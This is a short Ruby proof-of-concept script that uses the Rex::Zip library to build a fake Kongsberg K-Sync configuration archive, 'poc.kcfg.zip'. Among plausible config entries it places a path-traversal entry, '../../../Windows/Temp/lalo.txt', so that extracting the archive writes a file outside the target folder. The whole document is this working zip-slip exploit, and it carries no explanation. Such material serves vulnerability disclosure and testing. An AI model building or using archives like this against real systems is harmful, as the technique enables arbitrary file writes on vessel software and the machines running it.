#!/usr/bin/env ruby
# https://www.kongsberg.com/globalassets/maritime/software/k-syncv1_9_0.zip
require 'rex/zip'

zip = Rex::Zip::Archive.new
zip.add_file("systems/Kongsberg.EA 600.default.installation.xml")
zip.add_file("systems/Kongsberg.EA 600.default.runtime.xml")
zip.add_file("config/configuration profiles.xml")
zip.add_file("config/installed echo sounders.xml")
zip.add_file("config/Kongsberg.EA 600.installation.xml")
zip.add_file("config/Kongsberg.EA 600.runtime.xml")
zip.add_file("config/system settings.xml")
zip.add_file("../../../Windows/Temp/lalo.txt", "lalo is the PoC!")
zip.save_to("poc.kcfg.zip")
